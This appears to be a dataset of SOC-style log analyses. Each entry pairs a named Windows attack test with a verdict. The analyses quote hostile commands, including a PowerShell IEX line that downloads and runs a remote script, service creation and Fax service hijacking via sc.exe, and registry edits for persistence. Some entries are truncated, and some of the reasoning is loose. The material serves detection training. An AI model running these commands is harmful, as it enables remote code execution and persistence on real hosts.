EXO - Full access mailbox permission granted to a user,"In reviewing the provided Windows event logs, we need to perform a detailed analysis of the logged activities to spot any signs of malicious behavior. Here is a breakdown of each log and the findings:

### Windows PowerShell Log

1. **PowerShell Commands Execution:**
    - The logs show a PowerShell command sequence attempting to import the `ExchangeOnlineManagement` module and perform operations involving Office 365 user credentials.
    - It involves creating a secure string from a plaintext password (which is never advisable due to security risks), and connecting to Exchange Online using a potentially unauthorized account.
    - The operation modifies mailbox permissions to grant full access rights to another user (`delegate@contoso.com` to `operator@contoso.com`).

**Analysis:** 
- This behavior is suspicious because executing PowerShell scripts with hardcoded plaintext passwords, especially when modifying permissions, is often indicative of potential misuse or unauthorized access.
- Such operations, if not regularly performed under controlled circumstances, warrant further investigation to confirm their legitimacy.

### Sysmon Log

1. **Process Creations:**
   - There is repeated execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
   - There are also executions of `hover.exe`, `whoami.exe`, and `powershell.exe`. 
   
**Analysis:**
- `wevtutil.exe` is used to manage event logs, and its frequent invocation can suggest attempts to clear or tamper with logs.
- The use of `whoami.exe` could indicate reconnaissance activities to gather information about the current permissions and user context.
- The emergence of the PowerShell command in the Sysmon logs aligns with the PowerShell log's activities, enhancing the suspicious nature of the access rights change.

### Assessment

- The logs do present several red flags: a PowerShell script handling credentials in plaintext and modifying Exchange mailbox permissions, as well as potentially log-tampering activities with `wevtutil.exe`.

### Recommendations

- **Immediate Investigation:** Further scrutinize the context of these PowerShell commands. Consult with the relevant stakeholders to verify if this is a legitimate administrative activity or an unauthorized attempt. Also, review mailbox access logs in Exchange to validate these actions.
- **Review User Activity:** Perform a detailed review of `SERVER002\admin_test` activities around these timestamps to check for any other unusual patterns or unauthorized access.
- **Security Controls:** Consider implementing stronger controls for script execution policies and audit protocols to prevent similar activities without prior authorization.
- **Password Handling:** Encourage practices involving secure credential storage and retrieval instead of using plaintext in PowerShell scripts.

### Resolution

Given the information:
- The script handling credentials and performing Exchange Online operations without clear context or authorization.
- The possible implications of Process and Log management related executables being used in conjunction.
  
This case is marked as **SUSPICIOUS**. Further examination and corroboration with relevant individuals will determine any false positives or require escalation to a security incident if unauthorized actions are confirmed."
Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs,"Based on the provided Windows event logs, I will analyze each set of logs for potential indicators of malicious activity or compromise:

### Sysmon Log Analysis
1. **Wevtutil and Conhost Executions:** There are several executions of `wevtutil.exe` and `conhost.exe` within a very short time frame by the user `SERVER002\admin_test`. 
   - **Wevtutil.exe** can be legitimately used for managing event logs, but its frequent execution with varying process IDs could indicate an attempt to manipulate or exfiltrate event logs.
   - **Conhost.exe** is typically associated with command-line applications, its pairing with `wevtutil.exe` suggests possible usage to hide terminal interactions or facilitate scripting.

2. **Hostname and Whoami Executions:** The legitimate tools `hostname.exe` and `whoami.exe` are executed. These files are typically used for environment information gathering, which might be part of an initial reconnaissance phase by an intruder.

3. **PowerShell Execution:** There is a PowerShell execution containing a reference to `CreateProcessWithPipe.exe` executed from the `Temp` directory with an intricate command line:
    - `""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\x64\CreateProcessWithPipe.exe -program \""C:\Windows\System32\werfault.exe\"" -debug""`
    - PowerShell script execution from a Temp directory involving `CreateProcessWithPipe.exe` alongside `werfault.exe` in debug mode is highly unusual and potentially suspicious. Malicious actors often use PowerShell and temporary directories to execute script-based payloads.

### System Log Analysis
- The system logs capture some timezone adjustments and time synchronization events which appear to be benign and standard system processes.

### Windows PowerShell Log Analysis
- Similar entries refer to `CreateProcessWithPipe.exe` activity initiated through PowerShell, which reiterates the suspicion tied to leveraging PowerShell for potentially malicious actions.

### Security Log Analysis
- The security logs show system time adjustments carried out by `svchost.exe`, suggesting potential manipulation of system time which is often seen in log evasion techniques.

### Application Log Analysis
- The application log appears to capture standard operations related to the Software Protection Platform.

### Assessment and Recommendations:
- **Potential Threats/Risks:** The use of `PowerShell` from a temporary directory, particularly invoking a non-standard executable (`CreateProcessWithPipe.exe`), combined with the frequent execution of `wevtutil.exe`, raises concerns about potential log tampering or unauthorized system reconnaissance.
- **Resolution:** **SUSPICIOUS** - The activities observed suggest that further investigation is needed as there are multiple indicators (e.g., PowerShell script execution from a Temp folder, frequent `wevtutil.exe` usage) that may indicate a compromise but require corroborating evidence or context before confirming malicious intent.

### Guidance:
1. **Isolate and Investigate:** Consider isolating the machine to prevent potential lateral movement while conducting a deeper forensic analysis.
2. **Review PowerShell Scripts:** Analyze any suspicious PowerShell scripts or executables found in temporary directories for malicious content or obfuscation.
3. **Log Review:** Conduct an in-depth review of access permissions and logs to confirm if there has been unauthorized log access or manipulation.
4. **Mitigation and Patch Management:** Implement mitigations such as disabling unnecessary PowerShell scripting and enhance monitoring for command-line tools usage. Ensure all systems are up-to-date with security patches."
Service Installation CMD,"Based on the analysis of the provided logs, here are the findings:

1. **Service Creation and Execution:**
   - A new service named `fileTestService_CMD` was created with the executable `fileService.exe` located in a temporary user directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\fileService.exe`.
   - The service was set to start automatically with the `LocalSystem` account, indicating it runs with high privileges.
   - The use of temporary directories for service executables is unconventional and suspicious, as legitimate services typically run from well-known system directories.

2. **Command Execution:**
   - A command was executed via `cmd.exe` to create and start the service: `\""cmd.exe\"" /c sc.exe create fileTestService_CMD binPath= \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\fileService.exe\"" start=auto  type=Own & sc.exe start fileTestService_CMD`.
   - The execution of this command suggests an attempt to run arbitrary code as a service, which could be used for persistence or privilege escalation.

3. **Process Execution:**
   - The `fileService.exe` started successfully, running under the `NT AUTHORITY\SYSTEM` account, which has the highest level of privileges.
   - The process chain shows `cmd.exe` was used to create the service, which is a common tactic used by attackers to execute and maintain malicious payloads.

4. **Parent Process:**
   - The parent process for the creation of the service was `C:\\Windows\\System32\\wsmprovhost.exe`, invoked with the `-Embedding` flag. This process typically relates to Windows Remote Management and can be exploited if not adequately secured.

5. **Other Observations:**
   - Multiple instances of innocuous processes like `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and legitimate updates (`MicrosoftEdgeUpdate.exe`) were spotted but appear regular in context and likely part of routine system management tasks.

**Assessment:**
- The creation of a user-mode service in a non-standard directory, combined with its execution under high privileges through the use of command-line operations, raises significant red flags regarding potential compromise. This behavior is indicative of tactics often associated with malware deployment or lateral movement activities.

**Resolution: MALICIOUS**
- The logs show clear signs of malicious activity through the creation and execution of a potentially malicious service under privileged accounts with an unconventional setup.

**Guidance on How to Proceed:**
1. **Immediate Action:**
   - Quarantine the affected system (Server002) from the network to prevent potential lateral movement or further compromise.
2. **Forensic Analysis:**
   - Conduct a full forensic investigation of the system to identify the source and extent of the compromise, including the payload's method of execution and origin.
3. **Malware Analysis:**
   - Perform a static and dynamic analysis of the `fileService.exe` to understand its behavior.
4. **Remediation:**
   - Remove or disable the unauthorized service and delete the executable and any associated files.
5. **Rule Modifications and Monitoring:**
   - Implement detection rules for unusual service creation from temporary directories and enhance system monitoring for atypical `cmd.exe` executions.
6. **Review Access and Security Measures:**
   - Review and harden security on the affected and related systems, including implementing least privilege principles and ensuring all systems are properly patched.
7. **Incident Report:**
   - Document the incident thoroughly and report to relevant stakeholders. Initiate steps for recovery and review security policies to mitigate future risks."
Process Hollowing using PowerShell,"Upon review of the provided Windows event logs, I have identified several indicators of potentially malicious activity. My analysis focuses on key elements from various logs, particularly the Security, Sysmon, and Windows PowerShell logs.

### Analysis:

1. **Privilege Escalation & Suspicious Logon:**
   - **Security Log Event ID 4672:** The user `admin_test` was assigned a set of high privileges (SeDebugPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, etc.), indicating possible privilege escalation.
   - **Security Log Event ID 4624:** The logon events for `admin_test` using NTLMv2 indicate network logon attempts (LogonType 3) with NTLM authentication. The use of NTLM authentication along with the high privileges is uncommon and could potentially signal a compromised account.

2. **Unusual Process Execution:**
   - **Sysmon Log Event IDs and PowerShell Logs:** Indications of process hollowing techniques can be inferred from the PowerShell script `Start-Hollow.ps1` used to execute `C:\Windows\System32\notepad.exe` while hollowing it with `cmd.exe`. Process hollowing is a technique often used in malware attacks to inject malicious code into legitimate processes.
   - **Sysmon Log Event with `powershell.exe`:** The invocation of PowerShell with scripts from a temporary directory, especially with exploitation techniques like process hollowing, suggests suspicious behavior.

3. **PowerShell Activity:**
   - The Windows PowerShell logs show the execution of a script named `Start-Hollow.ps1` from a temporary directory using high privileges, further reinforcing the suspicion of malicious activity.

### Assessment:

Based on the convergence of suspicious activities such as privilege escalation, use of NTLM authentication, process hollowing, and the execution of PowerShell scripts with administrative privileges, the evidence strongly suggests that the activities involved are **malicious**.

### Recommendations:

- **Immediate Action:**
  - Isolate the affected system (`Server002`) from the network to prevent further potential propagation or data exfiltration.
  - Change all passwords associated with the user `admin_test` and any other potentially compromised accounts.
  - Conduct a thorough investigation to determine if the threat actor has persisted in other systems.
 
- **Long-term Measures:**
  - Implement additional monitoring and alerting for suspicious logon events and privilege escalation attempts.
  - Deploy tools to detect and respond to command-line execution and scripting anomalies.
  - Review and tighten user permissions and account management policies to reduce the risk of privilege escalation.
  - Harden PowerShell execution policies to prevent unauthorized script execution.

**Resolution: MALICIOUS**"
Remote Process Injection with Go using RtlCreateUserThread WinAPI,"### Detailed Analysis of the Logs

**System Log:**
- The system logs show time changes where the system clock was adjusted. The events related to ""Microsoft-Windows-Kernel-General"" and ""Microsoft-Windows-Security-Auditing"" regarding time updates (`EventID: 24, 1, 4616`) reflect normal system operations given they coincide with typical timezone or daylight savings adjustments. These do not inherently indicate malicious activity.

**Windows PowerShell Log:**
- There is a PowerShell log (`EventID: 600`) indicating an interesting command execution. The command `powershell.exe & {$process = Start-Process C:\Windows\System32\werfault.exe -passthru; C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug}` suggests executing a legitimate `werfault.exe` process followed by an execution of another application `RtlCreateUserThread.exe` from the Temp directory.
- Launching processes from the Temp directory, especially with such specific payloads, typically suggests attempts to evade detection and execute potentially harmful scripts or payloads. This activity is ""Suspicious,"" leaning towards malicious intent. Further investigation or sandboxing might uncover more definitely malicious behavior.

**Application Log:**
- The application logs (`EventID: 16384`) do not show any immediate signs of malicious activity. They reflect standard operations for the ""Software Protection Platform Service.""

**Sysmon Log:**
- Sysmon logs reveal several process executions, including the legit usage of system utilities (`whoami.exe`, `conhost.exe`, `wevtutil.exe`). However, the unusual execution of multiple PowerShell processes and subsequent temp location executions indicate suspicious actions that must be emphasized.
- The events include child processes spawned directly from PowerShell, which attempts to obfuscate or utilize legitimate Windows binaries maliciously.
- Execution of PowerShell scripts in this manner, calling executables from the temporary directory, is a common tactic for attackers (Living Off The Land Binaries, LOLBAS).

**Security Log:**
- Event ID 4672 indicates that the `admin_test` user was granted several high privileges, including `SeDebugPrivilege` — often indicative of privilege escalation activities.
- The sequence of events (4634, 4672, 4624) shows a typical logon/logoff flow, but the elevated privileges are concerning, given the context described above.

### Assessment of the Situation

The logs show significant suspicious behavior, notably:
- Execution of a potentially harmful command via PowerShell originating from a temporary directory.
- Multiple instances of invoking system processes which can be both administrative in nature or indicative of a compromise such as lateral movement or privilege escalation tactics (i.e., the use of services and processes with elevated privileges).
- The activity suggesting exploitation attempts or post-compromise actions related to the PowerShell invocation need thorough examination.

### Resolution and Guidance

Resolution: **SUSPICIOUS**

- The available data indicates a strong potential for malicious activity, predominantly driven by PowerShell command activities and privilege escalations that require further investigation to determine risk and mitigation steps.
- Immediate isolation of the machine is recommended to prevent possible lateral spread.
- Conduct a deeper forensic analysis: Examine memory and file system for any persistent threats or payloads.
- Investigation should also include network traffic analysis for external communications.
- Ensure policies are in place to limit execution from the Temp directory and review any execution of PowerShell scripts to tighten security measures against such suspicious activities."
Portable Executable Injection,"Upon analysis of the provided logs, the following observations and assessments can be made:

### Suspicious or Anomalous Behavior:

1. **Command Line Execution via PowerShell:**
   - The Windows PowerShell log indicates execution of a PowerShell script that involves launching an executable named `RedInjection.exe` from a temporary directory: 
     ```
     C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\RedInjection.exe
     ```
   - This action is followed by stopping Notepad processes. The location of the executable and the lack of company metadata in its Sysmon log entry (Process ID 1124) are unusual.

2. **Privilege Use:**
   - The logs capture security events indicating privilege escalation (EventID 4672) with privileges such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`. These elevated privileges without a corresponding known and legitimate administrative task can be a red flag.

3. **Network Logon and External Machine Access:**
   - EventID 4624 and 4634 in the Security logs show network logons and logoffs by a user `admin_test`.
   - The use of LogonType 3 (network logon) from external machines (`DESKTOP-3HL5B2P`) is logged, raising suspicions of remote access or potentially unauthorized use, considering the subsequent privilege escalation.

4. **Use of Temporary Directories for Execution:**
   - Execution of processes from temporary directories (`RedInjection.exe`) is often associated with malware behavior or fileless attacks.
   
5. **Process Creation and Parent-Child Relationships:**
   - Examining the Sysmon logs:
     - `RedInjection.exe`, launched from PowerShell, later initiates `Notepad.exe`. Such behavior could imply it is using Notepad.exe as a proxy or cover operation, relevant to malicious activities like injection attacks.

### Conclusions:

- The presence of `RedInjection.exe`, its execution through PowerShell, and subsequent termination of `Notepad.exe` without proper context or authorization are indicative of potentially malicious activity.
- The combination of privilege escalation with potent privileges and network logons from external hosts suggests a risk of compromise, particularly under the administrative user context. 

### Resolution:
- **MALICIOUS** - The logs indeed show patterns typical in a compromise, with the execution of an unrecognized executable from a temporary path, use of administrative privileges, and apparent attempts to hide malicious action under commonplace system operations (like launching `Notepad.exe`). 

### Guidance on How to Proceed:
- Quarantine the affected system to prevent further spread or damage.
- Conduct a thorough forensic analysis to uncover the full scope of the compromise.
- Review network traffic logs for the origin or control channels associated with `RedInjection.exe`.

Azure AD - adding service principal to Azure AD role,"### Detailed Analysis:

**1. Anomalous Activity Detection:**
- **Frequent Invocations of SysInternals Tools:** There are multiple PowerShell script executions captured in the logs, particularly from the user `SERVER002\admin_test`. Specifically, PowerShell was used to import the AzureAD module and attempted to manage AzureAD roles, such as adding a service principal to the ""Global Reader"" role. This type of automation, especially as a PowerShell script, should be closely reviewed for legitimacy, as it can potentially be used to manipulate cloud resources or credentials in a manner consistent with credential theft or privilege escalation.
- **Suspicious PowerShell Command-Line:** A PowerShell command included manipulation of secure strings and attempted execution of AzureAD admin tasks by passing credentials in plain text form. This is unusual and can indicate attempts to automate Azure management tasks or exploit AzureAD – potentially pointing to credential abuse or misuse.
- **Execution of Elevated Commands:** Execution with high integrity levels, such as the use of PowerShell by `SERVER002\admin_test`, indicates potential improper use of admin privileges. The presence of multiple `wevtutil.exe` executions by an administrator account further necessitates investigation as it can be used for log manipulation or evasion.
  
**2. Malicious Activity Indicators:**
- **PowerShell and Role Assignment:** The PowerShell command to add a service principal to a directory role, especially one like ""Global Reader,"" is a significant red flag for potentially unauthorized privilege assignment. This is indicative of actions often associated with account takeover or establishing persistence.
- **Lack of Detailed Logs in Security Section:** The absence of detailed security logs may imply that log capture settings have been overridden or logs suppressed to hide malicious activities.

### Assessment:
Based on the provided logs, it appears that the actions of `SERVER002\admin_test`, particularly around the PowerShell execution of AzureAD credential management and directory role modifications, are suspicious. These behaviors align with activities seen in unauthorized access or insider threat scenarios.

### Threats and Risks Identified:
- **Credential Abuse:** The potential plain text password usage and credential object creation may expose sensitive information.
- **Privilege Escalation Attacks:** Modifications to AzureAD directory roles suggest potential privilege elevation attempts.
- **Log Manipulation:** Frequent usage of `wevtutil` could be a tactic to clear or tamper with event logs to cover tracks of unauthorized activities.

### Resolution: **SUSPICIOUS**

### Guidance on How to Proceed:
1. **Immediate Investigation:** Confirm the legitimacy of `admin_test` account activities by consulting with the account owner or IT administration.
2. **Inspect PowerShell Scripts:** Verify the source and intent of the PowerShell scripts executed, focusing on credential operations and Azure role modifications.
3. **Review Audit Logs:** Ensure robust logging of Azure activities and review past logs for any further anomalies linked to role and credential management.
4. **Implement Controls:** Establish multi-factor authentication for AzureAD roles, particularly for accounts with elevated privileges, and restrict the use of PowerShell scripts that are not centrally approved.
5. **Increase Monitoring:** Deploy advanced monitoring for any further activity by `admin_test` and other privileged accounts, using anomaly detection mechanisms.
6. **Check Network Traffic:** Look for any unusual network connections or data exfiltration attempts from `Server002`."
Domain Password Policy Check: Only Two Character Classes,"### Analysis

Upon reviewing the provided event logs, there are several points worth noting:

1. **PowerShell Activity**:
   - There are numerous logs detailing PowerShell execution with an embedded script that checks for a local file containing a password and attempts to set a new password for the user. The script logs messages detailing success or exceptions.
   - The presence of a PowerShell script that handles credentials and alters passwords suggests heightened risk for credential theft or unauthorized access.

2. **Security Events**:
   - Event logs from the security channel include privilege escalation events (`4672`) and authentication of potentially sensitive accounts (like SYSTEM). Such activity indicates the potential misuse of privileged credentials.
   - Multiple `4798` events are logging each user in the system, which can indicate reconnaissance activities.

3. **Sysmon Logs**:
   - The Sysmon logs show the execution of several processes, notably PowerShell (`powershell.exe`) under the user `SERVER002\admin_test`. While PowerShell execution is common, its usage together with credential scripts compels a closer examination.
   - Execution of `wevtutil.exe`, `conhost.exe`, and other commands strongly indicate that the `admin_test` user has executed potentially administrative utilities.
   - Other benign processes such as Telemetry (`CompatTelRunner.exe`) and Windows services (`svchost.exe`) are recorded with expected command lines.

### Assessment

- **Suspicious PowerShell Scripting**: The PowerShell script's operations make it highly suspicious, especially considering its focus on manipulating user credentials in a seemingly automated fashion. There is the potential for malicious intent, intending unauthorized access or creating persistent unauthorized credential changes.

- **Privileges with SYSTEM Logins**: The regular logging of `SYSTEM`-level logins, particularly with privileges highlighted in `4672`, is concerning, especially in combination with the unexpected credential management script use.

- **User: `admin_test`**: This user account appears repeatedly across multiple execution logs, highlights its importance, or its misuse. The `admin_test` account triggering these commands could indicate an attempt by an insider or a compromised account situation.

### Resolution

Based on the above findings, the activity within these logs can be classified as **SUSPICIOUS**. While there is no incontrovertible proof of malicious actions (like data exfiltration or definitive exploit usage), several factors merit comprehensive investigation, specifically:

- The embedded PowerShell script for password manipulation.
- The recon-like behavior through multiple auditing logs checking user details.
  
### Guidance on Proceeding

1. **Immediate Forensic Collection**: Capture memory and disk images for further analysis.
2. **Credential Monitoring**: Investigate the history, creation, and potential unauthorized actions by `admin_test`.
3. **Audit Privileged Accounts**: Conduct a thorough review of the use of SYSTEM-level accounts and any unusual elevation of privileges.
4. **PowerShell Review**: Initiate deeper audits on script usage and ensure logs capture full command lines for future events.
5. **User Account Check**: Confirm the legitimacy of the `admin_test` user and examine recent activity for anomalies. 

Given that no definitive malicious activity is evident but numerous red flags exist, investigating the context and source of these events will help determine further action, which may include escalation to confirm or dismiss potential security incidents."
PowerShell Registry RunOnce,"Upon analyzing the provided Windows event logs, a sequence of activities can be traced, with the following points of interest identified:

1. **Elevated Privileges and Logins**:
   - The user ""admin_test"" has logged on with elevated privileges. Events 4672 in the Security log indicate that this user received various powerful privileges, such as `SeDebugPrivilege` and `SeBackupPrivilege`. While it is not entirely abnormal for an admin account to have elevated privileges, it is essential to confirm whether these actions align with expected operations.

2. **Executed Commands**:
   - The use of common administrative tools such as `whoami.exe` and `wevtutil.exe` is noted. These tools are legitimate but can be misused by attackers for enumeration and log manipulation, respectively. 
   - Of most concern is the use of `powershell.exe` with a command line that includes downloading and executing a script from a remote source: `""IEX (New-Object Net.WebClient).DownloadString('https://github.com/file/file-file/raw/master/files/data.001/src/Discovery.bat')""`. This action is highly suspicious because it reflects a technique often used by attackers to execute script-based payloads from a remote location.

3. **Process Activity**:
   - The PowerShell activity registered in the logs aligns with typical indicators of malicious intent due to the remote script execution.
   - The `MicrosoftEdgeUpdate.exe` processes appear to be related to legitimate software update activities, with multiple instances likely resulting from normal update propagation mechanisms.

4. **PowerShell Logs**:
   - The logs in the Windows PowerShell log further confirm the execution of PowerShell commands intended to set a registry RunOnce key to execute downloaded scripts. This behavior is characteristic of a persistent mechanism or malicious payload execution.

Overall, the presence of elevated privileges followed by unauthorized and potentially harmful PowerShell script execution from a remote source suggests malicious activity. The name ""admin_test"" accounts for access attempts may need scrutiny to determine legitimacy.

### Conclusion:
Based on the evidence gathered:

**Resolution: MALICIOUS**

### Recommended Actions:
1. **Containment and Eradication**:
   - Immediately isolate the affected host from the network.
   - Suspend the ""admin_test"" account while verifying its legitimacy and intended use.
   - Conduct an in-depth forensic analysis to determine the full scope and impact.

2. **Prevention**:
   - Review and strengthen PowerShell script execution policies.
   - Monitor for unauthorized privilege escalation and external script execution across hosts.
   - Train staff on identifying phishing attempts or suspicious download activities, as these are common methods to initiate such attacks.

3. **Recovery and Follow-up**:
   - Restore the affected system from a known clean backup.
   - Verify and remediate any impacted services or applications.
   - Perform an organization-wide security audit and strengthen security policies.

Taking these steps will help ensure the organization can defend against similar threats in the future and safely return operations to normal."
Modify BootExecute Value,"**Detailed Log Analysis:**

1. **Windows PowerShell Logs:**
   - There is a PowerShell command execution attempting to back up registry settings and modify the `BootExecute` registry value using the `reg.exe` tool. 
   - This behavior is often associated with administrative tasks; however, modifying the `BootExecute` value to include ""autocheck autoche *"" seems suspicious as such alterations can be indicative of attempts to bypass or alter system startup checks.

2. **Security Logs:**
   - The logs show standard Windows Time service adjustments using `svchost.exe`. 
   - No direct indicators of malicious activity appear in the security logs provided.

3. **Sysmon Logs:**
   - Multiple Sysmon logs record significant activity involving the launch of various legitimate processes (`wevtutil.exe`, `conhost.exe`, `reg.exe`, etc.) under the user `SERVER002\admin_test`.
   - Notably, the `reg.exe` process is involved in exporting and potentially altering registry keys, which matches the PowerShell logs' behavior.
   - The frequent use of PowerShell and registry modification processes, especially when tied to rapid execution within a sequence, could indicate scripted or automated deployment, such as a script aimed at changing system configurations. These actions warrant a closer look due to their capability to change critical system settings.

4. **Application Logs:**
   - Logs display normal message service stops and starts for Microsoft Edge Update, common in software maintenance.

5. **System Logs:**
   - Normal Kernel-General and Time-Service events indicative of regular system activity such as time synchronization.
   
**Assessment and Findings:**

- The behavior observed in the PowerShell and Sysmon logs—particularly the execution aimed at modifying a Windows registry setting concerned with boot sequences—suggests potential preparation for persistence or altering system initialization behaviors. This can indeed be part of malware or attack toolkit effects aiming to sustain or hide malicious activities.
  
- Although Edge Update-related activities appear benign and typical for system maintenance, the context provided by the PowerShell logs, combined with specific Sysmon process executions (e.g., registry modifications), indicates a layer of activity that could be directly associated with an earlier or unobserved installation that might be malicious. Hence, these observations cannot be considered safe without a doubt and require further investigation.

**Resolution: SUSPICIOUS**

**Guidance:**

- **Immediate Actions:**
  - Review the execution context of the PowerShell script including its origin and purpose. Investigate who initiated this script and why it was necessary to alter critical registry keys.
  - Conduct a system integrity check utilizing tools such as Sysinternals Autoruns and Process Explorer to further inspect startup executables and service configurations potentially altered by these commands.

- **Further Investigation:**
  - Review related logs for any potential execution sequences or calls that may link this registry change to unauthorized software installs or package deployments.
  - Consider employing a threat-hunting session using EDR solutions focused on detecting unauthorized persistence mechanisms.
  
- **Monitoring Recommendations:**
  - Implement enhanced monitoring for registry changes, particularly around system-critical keys like `BootExecute`.
  - Increase alerting and monitoring on high-integrity level executions from users who should not generally require such permissions, focusing on automation or script executions involving PowerShell."
Modify Fax service to run PowerShell,"### Detailed Analysis:

1. **Frequent Use of Windows Command Line Tools**
   - **Processes of Interest:**
     - `wevtutil.exe` and `conhost.exe` were executed multiple times, indicating potential enumeration activities or administrative tasks. `wevtutil.exe` is often used to query event logs, which can be legitimate but also a sign of reconnaissance if misused.
     - `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, and `sc.exe` executions were noted. These tools are often used for system reconnaissance and manipulation, especially the `cmd.exe` event that reconfigures the service path to execute a PowerShell command.
   - **Command-Line Alterations:**
     - The `cmd.exe` process executed a command to change the `binPath` of the Fax service to a PowerShell instance with a `write-host` command. This type of manipulation can be a method for executing arbitrary code or maintaining persistence.

2. **Service Manipulation and Privilege Escalation:**
   - **Service Configuration:**
     - Alteration of the Fax service (`sc config Fax`) with the intention to execute a PowerShell script is highly suspicious. This action can be leveraged for privilege escalation or lateral movement.
   - **Use of High Integrity Level:**
     - Processes are running at a high integrity level, further pointing to potential privilege misuse.

3. **Use of PowerShell:**
   - The presence of PowerShell commands executed by processes running under `NT AUTHORITY\NETWORK SERVICE` without clear benign justification raises a red flag. PowerShell is a powerful scripting interface and a common vector in attacks for executing payloads.

4. **Suspicious Windows Event Logs Activity:**
   - The repeated use of system utilities like `svchost.exe` and time synchronization adjustments in quick succession suggest potential obfuscation tactics, especially concerning the rapid succession of time change events.

5. **Edge Update Execution:**
   - Multiple processes involved in updating Microsoft Edge are observed. However, they operate under `NT AUTHORITY\SYSTEM`, which is their expected behavior. Although extensive, these might represent a legitimate update process.

### Assessment of the Situation:

- **Indicators of Compromise:**
  - The execution of system utilities like `wevtutil`, `cmd.exe` with altered service paths, and `PowerShell.exe` suggests potential compromise through command-line manipulation and script execution.
  - The execution chain with PowerShell that starts with `cmd.exe` is particularly suspicious and indicative of potentially malicious activity.
- **Lateral Movement or Persistence:**
  - Service modification (`sc config Fax`) suggests attempts at creating persistence or privilege escalation points.

### Resolution: **MALICIOUS**

Given the analysis, the logs contain indicators of compromise through suspicious command-line activity, use of administrative tools, and potential misuse of the Windows services. Such behavior is consistent with attempts to execute unauthorized scripts that may involve data exfiltration, system enumeration, or setting persistence.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the machine from the network to prevent further potential lateral movement or data exfiltration.
   - Perform a memory dump of the affected system for in-depth analysis.
   - Review recent changes to system services and scheduled tasks.
   - Investigate user accounts with high-privilege and their recent activities.

2. **Remediation:**

Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),"Upon analyzing the provided Windows event logs, here are the detailed assessments and observations:

### PowerShell Logs:
- **Suspicious PowerShell Activity**: The PowerShell logs indicate the execution of a script with an unusual command line that involves starting `werfault.exe` and subsequently launching `CreateRemoteThreadNative.exe` with the `-debug` and `-pid` arguments. The usage of `CreateRemoteThreadNative.exe` is known to be associated with malicious activities like injecting threads into other processes, which is common in malware attacks.
- **Command Line Anomalies**: The direct execution of `CreateRemoteThreadNative.exe` often indicates an attempt to manipulate or spy on another process running on the system, which is a known technique used in attacks like process hollowing or DLL injection.

### Application and System Logs:
- **Defender Active**: The application logs state that Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`), which is good but doesn’t counter the suspicious activity detected.
- **Windows Updates**: System logs indicate that system updates are ongoing, which is standard behavior and typically not associated directly with suspicious activity. 
- **Time Anomaly Detected**: A general time discrepancy caught in the system logs where the system time was altered. This can be legitimate but also a common tactic to disrupt logging and event tracking by an attacker.

### Sysmon Logs:
- **Process Activity**: The execution of a series of legitimate Windows processes is recorded, such as `whoami.exe` and `conhost.exe`. While these are typically benign, their parent process originating from PowerShell using unusual command lines raises suspicion.
- **Execution of `werfault.exe`**: The `werfault.exe` is a legitimate Windows program for error reporting but its execution tied to the `CreateRemoteThreadNative.exe` in conjunction with PowerShell is concerning.

### Security Logs:
- **Privileged Account Activity**: The logs show the `admin_test` user account engaging in activities that required elevated privileges (`SeDebugPrivilege`, etc.). This could be normal for administrative tasks but, given the context, raises red flags about potential misuse of a high-privilege account.

### Assessment:
Given the outlined observations, we are facing activities that are indicative of potentially malicious behavior. The use of PowerShell to start `werfault.exe` and then a suspicious executable for possibly creating remote threads signifies sophisticated exploitation. The indicators of compromise align with known attack vectors where PowerShell is used for executing payloads silently within systems.

### Resolution:
Based on the detailed log analysis, this activity does warrant greater scrutiny. Thus, I conclude this activity falls under the resolution:

**MALICIOUS**

### Recommendations:
1. **Immediate Containment**: Isolate the host `Server002` from the network to prevent lateral movement or further data exfiltration.
2. **Forensic Analysis**: Conduct a deep-dive forensic analysis of the host to uncover the full extent of the compromise and identify potential persistence mechanisms.
3. **Patch and Update**: Verify all system patches and antivirus definitions are up to date.
4. **Review User Accounts**: Investigate the `admin_test` account and review all recent activities for signs of unauthorized use. Consider a password reset and monitoring enhancements.
5. **Incident Response**: Initiate a company-wide alert and remind employees of security policies, particularly regarding suspicious emails or unexpected pop-ups.

This thorough approach will help mitigate the immediate threat and prevent future occurrences through awareness and preparedness enhancement."

#### 1. **Windows PowerShell Log:**
- No logs were provided for PowerShell activity. This area cannot be evaluated for anomalies or threats specific to PowerShell usage on the host.

#### 2. **System Log:**
- **Event ID 24 & 1:** These events involve the Windows Kernel-General and Time-Service indicating normal time adjustment by svchost.exe. The time change event logs are routine for time synchronization and do not imply malicious activity.

- **Event ID 35:** This logs time synchronization with time.windows.com, which is a legitimate time source for Windows systems. There are no indicators of compromise here.

#### 3. **Application Log:**
- **Event ID 16384:** Indicates a notice from the Software Protection Platform Service, with no visible malicious signs.
- **'Service stopped' Messages:** Related to EdgeUpdate. This could indicate routine software updates stopping services temporarily, especially given the frequent updates to Edge components in other logs.

#### 4. **Security Log:**
- No specific items were provided for analysis in the section that pertains to security events.

#### 5. **Sysmon Log:**
- **Process Creation and Registry Modification:**
  - **Command:** `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\... ""`
    - This command is concerning because it involves registry modification typically associated with persistence mechanisms or malware activity, as it attempts to add a registry add-in under suspected 'Malware' naming, along with the usage of `amsi.dll`.
    - **Indicator of Compromise:** This behavior indicates potential unauthorized persistence setup or an attempt to subvert antivirus scanning, often seen in trojan-type malware.
    
- **Processes (hostname.exe, whoami.exe, conhost.exe):** Routine administrative or diagnostic processes executed by the user `SERVER002\admin_test`. However, these are not usually run together without a specific diagnostic purpose, which raises suspicion when combined with the suspicious registry modification.
  
- **Edge Update Activities:**
